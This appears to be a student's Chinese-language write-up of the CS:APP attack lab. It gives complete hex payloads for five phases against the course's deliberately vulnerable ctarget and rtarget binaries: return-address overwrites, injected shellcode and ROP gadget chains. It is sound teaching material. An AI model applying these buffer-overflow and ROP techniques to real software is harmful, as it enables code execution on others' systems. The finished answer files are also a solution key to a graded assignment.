# attackLab

os:Linux

```shell
objdump -d ctarget > ctarget.asm
objdump -d rtarget > rtarget.asm
```



hex2raw使用

```shell
./hex2raw < {file name} | ./ctarget -q
```

```shell
./hex2raw<ans1.txt>1.txt
./ctarget -q -i 1.txt
```



getbuf

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```





test

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```assembly
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq  
```





#### phase1

通过代码注入执行让程序调用touch1()

```c
void touch()
{
    vlevel = 1;  /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

观察getbuf的汇编

sub    $0x28,%rsp

栈内分配了40个字节，因此超过40字节的部分就会覆盖掉源代码

```assembly
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```



分析函数调用的过程，当调用一个函数时，会将该函数运行完时要返回的地址压入栈中，于是利用代码注入，将地址覆盖成touch1()的地址，就可以实现函数返回后调用touch1()

touch1 地址为0x4017c0

前四十个字节无所谓，地址填写注意小段法



##### ans1.txt

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```



#### phase2

touch2

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x\n)", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

```assembly
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```



cookie 为 0x59b997fa

需要修改rdi寄存器（val）的值和cookie的值相同

（感觉advice已经基本把解题思路说清了）

将cookie的值写入rdi

不用使用jmp，call。使用ret（面向返回编程）



因为要执行我们自己设定的汇编指令，只能在栈内编写

栈顶虽然是从大到小，但是运行是从小到大，因此需要知道栈顶的地址

先写入cookie的值，再将touch2的地址压入栈，ret会去调用touch2

level2.s

```assembly
mov $0x59b997fa, %rdi
pushq $0x4017ec
retq
```

```shell
gcc -c level2.s
objdump -d level2.o > level2.asm
```

level2.asm

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```



查看栈顶

```shell
gdb ctraget
b *0x4017ac
r -q
info register rsp
rsp 0x5561dc78 0x5561dc78
```



##### ans2.txt

```
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```



#### phase3

hexmatch

```c
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

touch3

```c
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

```assembly
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	callq  401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
```



advice中提到，touch3和hexmatch的调用会污染栈，选择合适位置保存，test的栈顶地址相对较大，选择test的栈顶



查看栈顶

```shell
gdb ctraget
b *0x40196c
r -q
info register rsp
rsp 0x5561dca8 0x5561dca8
```



level3.s

```assembly
mov $0x5561dca8, %rdi
pushq $0x4018fa
retq
```
```shell
gcc -c level3.s
objdump -d level3.o > level3.asm
```

level3.asm

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
```



401968:	48 83 ec 08          	sub    $0x8,%rsp

所以跳过八个字节，地址占4个字节，于是再跳过4个字节



##### ans3.txt

```
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```





#### phase4

```shell
gcc -c -Og farm.c
objdump -d farm.o > farm.asm
```



依然是要调用touch2

```assembly
mov $0x59b997fa, %rdi
pushq $0x4017ec
retq
```

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```



advice中提醒我们使用两端gadgets就能实现，而且是在start_farm和mid_farm中寻找

```assembly
0000000000000006 <getval_142>:
   6:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
   b:	c3                   	retq   

000000000000000c <addval_273>:
   c:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  12:	c3                   	retq   

0000000000000013 <addval_219>:
  13:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  19:	c3                   	retq   

000000000000001a <setval_237>:
  1a:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  20:	c3                   	retq   

0000000000000021 <setval_424>:
  21:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  27:	c3                   	retq   

0000000000000028 <setval_470>:
  28:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  2e:	c3                   	retq   

000000000000002f <setval_426>:
  2f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  35:	c3                   	retq   

0000000000000036 <getval_280>:
  36:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  3b:	c3                   	retq  
```

不能找到直接将cookie值写入的字节

考虑使用popq，查表（Figure3 B）得范围为58-5f，只有58在farm中

确定第一步为

popq %rax 

因为两步可以完成，下一步一定是movq %rax %rdi

查表（Figure3 A）得 48 89 c7

```assembly
popq %rax
retq
movq %rax,%rdi
retq
```



!!90代表空操作!!

```assembly
0000000000000036 <getval_280>:
  36:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  3b:	c3                   	retq  
000000000000002f <setval_426>:
  2f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  35:	c3                   	retq   
```

选择好gadgets，注意，跳转地址为ratarget内，不是fram内的地址



##### ans4.txt

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 #popq %rax ; ret
fa 97 b9 59 00 00 00 00 #cookie
c5 19 40 00 00 00 00 00 #movq %rax %rdi ; ret
ec 17 40 00 00 00 00 00 #touch2
```





#### phase5

Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3,

you caused a program to execute machine code of your own design. If CTARGET had been a network server,

you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the

main devices modern systems use to thwart buffer overflflow attacks. Although you did not inject your own

code, you were able inject a type of program that operates by stitching together sequences of existing code.

You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations

consider stopping right now.

他真的，我哭死



调用touch3

官方题解使用8个gadgets

ascii要存在栈中，偏移量无法直接写入，使用farm.c中的add_xy



###### 因此需要将rsp的值保存下来

查表（Figure3 A）得 48 89 {e0-e7}

farm内只有48 89 e0

movq %rsp,%rax



再从rax内保存

48 89 {c0-c7}

存在c7

movq %rax,%rdi



成功将rsp保存在rsi内



###### 计算偏移地址

根据phase4，只有

popq %rax



为了调用add_xy计算，将rax的值写入rsi

排查过程省略

movl %eax,%ecx

movl %ecx,%edx

movl %edx,%esi

add_xy

movq %rax,%rsi









```assembly
movq %rsp,%rax
retq
movq %rax,%rdi
retq
popq %rax
movl %eax,%ecx
retq
movl %ecx,%edx
retq
movl %edx,%esi
retq
call add_xy
retq
movq %rax,%rsi
retq
```



计算过程略

##### ans5.txt

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00 #偏移量，注入完代码后再保存ascii，获得偏移量
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61 00
```







#### p.s.

想办法调用validate是不是就能直接得分了，不知道有什么保护措施

读汇编代码时，不用像bomblab一样一行行读，切实了解了segmentation fault的隐患，加深了code injection的概念
